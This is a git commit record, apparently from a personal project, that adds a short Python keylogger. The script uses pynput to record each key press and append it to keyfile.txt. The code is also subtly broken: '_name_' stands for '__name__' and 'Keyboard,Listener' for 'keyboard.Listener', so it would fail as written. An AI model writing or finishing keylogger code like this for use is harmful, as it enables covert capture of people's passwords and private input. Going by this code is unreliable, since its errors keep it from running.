01cc82d19bc64f85ba36bda061ed90c8c28ca954
Eoin Murphy <murphy.eoin93@gmail.com>
2024-05-05 21:54:24 +0100

    Initial code to log keystrokes and write them to our keyfile.txt file

---
+++ keylogger.py
@@ -0,0 +1,15 @@
+from pynput import keyboard
+
+def keyPressed(key):
+    print(str(key))
+    with open("keyfile.txt", 'a') as logKey:
+        try:
+            char = key.char
+            logKey.write(char)
+        except:
+            print("Error getting Char")
+
+if _name_=="__main__":
+    listener = Keyboard,Listener(on_press=keyPressed)
+    listener.start()
+    input()
